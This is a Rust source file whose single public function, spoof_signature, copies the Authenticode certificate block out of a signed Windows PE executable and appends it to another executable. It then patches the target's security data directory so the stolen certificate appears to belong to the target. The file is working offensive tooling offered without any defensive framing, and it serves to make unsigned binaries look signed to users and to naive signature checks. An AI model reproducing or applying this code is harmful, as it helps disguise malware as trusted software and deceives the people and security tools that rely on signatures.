use std::fs::{File, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::Path;

const IMAGE_DIRECTORY_ENTRY_SECURITY: usize = 4;

pub fn spoof_signature(target_path: &Path, source_path: &Path) -> Result<(), String> {
    let mut source_file = File::open(source_path).map_err(|e| format!("Failed to open source file: {}", e))?;
    let mut source_data = Vec::new();
    source_file.read_to_end(&mut source_data).map_err(|e| format!("Failed to read source file: {}", e))?;

    let (cert_offset, cert_size) = get_security_directory(&source_data)?;

    if cert_offset == 0 || cert_size == 0 {
        return Err("Source file is not signed (no security directory found)".to_string());
    }

    if cert_offset as usize + cert_size as usize > source_data.len() {
         return Err("Invalid security directory in source file".to_string());
    }

    let cert_data = &source_data[cert_offset as usize..(cert_offset + cert_size) as usize];

    let mut target_file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(target_path)
        .map_err(|e| format!("Failed to open target file: {}", e))?;
    
    // Move to end to append
    let original_len = target_file.seek(SeekFrom::End(0)).map_err(|e| e.to_string())?;
    
    // Write certificate data
    target_file.write_all(cert_data).map_err(|e| e.to_string())?;

    // Update target PE header
    // The new offset is the original length of the file (where we started appending)
    let new_cert_offset = original_len as u32;
    update_security_directory(target_path, new_cert_offset, cert_size)?;

    Ok(())
}

fn get_security_directory(data: &[u8]) -> Result<(u32, u32), String> {
    if data.len() < 0x40 {
        return Err("File too small".to_string());
    }
    
    let e_lfanew = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
    
    if data.len() < e_lfanew + 24 + 96 { 
        return Err("Invalid PE header".to_string());
    }

    let opt_header_offset = e_lfanew + 24;
    let magic = u16::from_le_bytes(data[opt_header_offset..opt_header_offset+2].try_into().unwrap());
    
    let data_dirs_offset = if magic == 0x20B {
        opt_header_offset + 112
    } else if magic == 0x10B {
        opt_header_offset + 96
    } else {
        return Err("Unknown Magic number in OptionalHeader".to_string());
    };

    let sec_dir_offset = data_dirs_offset + (IMAGE_DIRECTORY_ENTRY_SECURITY * 8);
    
    if data.len() < sec_dir_offset + 8 {
        return Err("File too small for Data Directories".to_string());
    }

    let virt_addr = u32::from_le_bytes(data[sec_dir_offset..sec_dir_offset+4].try_into().unwrap());
    let size = u32::from_le_bytes(data[sec_dir_offset+4..sec_dir_offset+8].try_into().unwrap());

    Ok((virt_addr, size))
}

fn update_security_directory(path: &Path, offset: u32, size: u32) -> Result<(), String> {
    let mut file = OpenOptions::new().read(true).write(true).open(path).map_err(|e| e.to_string())?;
    let mut buf = [0u8; 1024]; 
    let bytes_read = file.read(&mut buf).map_err(|e| e.to_string())?;
    if bytes_read < 0x40 {
        return Err("File too small".to_string());
    }

    let e_lfanew = u32::from_le_bytes(buf[0x3C..0x40].try_into().unwrap()) as usize;
    if bytes_read < e_lfanew + 24 {
        return Err("File too small for PE header".to_string());
    }

    let opt_header_offset = e_lfanew + 24;
    let magic = u16::from_le_bytes(buf[opt_header_offset..opt_header_offset+2].try_into().unwrap());

    let data_dirs_offset = if magic == 0x20B {
        opt_header_offset + 112
    } else if magic == 0x10B {
        opt_header_offset + 96
    } else {
        return Err("Unknown Magic number".to_string());
    };

    let sec_dir_offset = data_dirs_offset + (IMAGE_DIRECTORY_ENTRY_SECURITY * 8);

    file.seek(SeekFrom::Start(sec_dir_offset as u64)).map_err(|e| e.to_string())?;
    file.write_all(&offset.to_le_bytes()).map_err(|e| e.to_string())?;
    file.write_all(&size.to_le_bytes()).map_err(|e| e.to_string())?;

    Ok(())
}
